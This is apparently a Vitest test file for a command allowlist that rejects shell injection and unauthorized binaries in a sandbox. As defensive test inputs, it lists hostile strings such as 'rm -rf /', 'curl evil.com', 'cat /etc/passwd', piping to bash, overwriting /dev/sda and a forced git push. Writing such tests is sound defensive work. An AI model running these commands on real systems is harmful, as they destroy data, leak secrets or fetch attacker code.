import { SecurityViolationError } from "@/lib/errors";
import { truncateOutput, validateAndResolveCommand } from "@/lib/security/allowlist";
import { describe, expect, it } from "vitest";

describe("Command Allowlist & Sandbox Security", () => {
  const projectConfig = {
    installCommand: "npm ci",
    testCommand: "npm test",
    lintCommand: "npm run lint",
    typecheckCommand: "npx tsc --noEmit",
    buildCommand: "npm run build",
  };

  it("resolves valid predefined project commands", () => {
    const testCmd = validateAndResolveCommand("test", undefined, projectConfig);
    expect(testCmd.binary).toBe("npm");
    expect(testCmd.args).toEqual(["test"]);

    const typecheckCmd = validateAndResolveCommand("typecheck", undefined, projectConfig);
    expect(typecheckCmd.binary).toBe("npx");
    expect(typecheckCmd.args).toEqual(["tsc", "--noEmit"]);
  });

  it("rejects dangerous shell injection operators in commands", () => {
    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "npm test; rm -rf /", projectConfig)
    ).toThrowError(SecurityViolationError);

    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "npm test && curl evil.com", projectConfig)
    ).toThrowError(SecurityViolationError);

    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "npm test `cat /etc/passwd`", projectConfig)
    ).toThrowError(SecurityViolationError);

    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "npm test | bash", projectConfig)
    ).toThrowError(SecurityViolationError);

    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "npm test > /dev/sda", projectConfig)
    ).toThrowError(SecurityViolationError);
  });

  it("rejects unauthorized binaries not on allowlist", () => {
    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "bash -c 'echo pwned'", projectConfig)
    ).toThrowError(SecurityViolationError);

    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "python -c 'print(1)'", projectConfig)
    ).toThrowError(SecurityViolationError);

    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "sudo apt-get install", projectConfig)
    ).toThrowError(SecurityViolationError);
  });

  it("restricts git subcommands to safe inspect/branch operations", () => {
    const status = validateAndResolveCommand("git_status", undefined, projectConfig);
    expect(status.binary).toBe("git");

    expect(() =>
      validateAndResolveCommand("custom_allowlisted", "git push origin main --force", projectConfig)
    ).toThrowError(SecurityViolationError);
  });

  it("truncates large output strings safely", () => {
    const hugeOutput = "A".repeat(50000);
    const truncated = truncateOutput(hugeOutput, 1000);
    expect(truncated.length).toBeLessThan(2000);
    expect(truncated).toContain("TRUNCATED");
  });
});
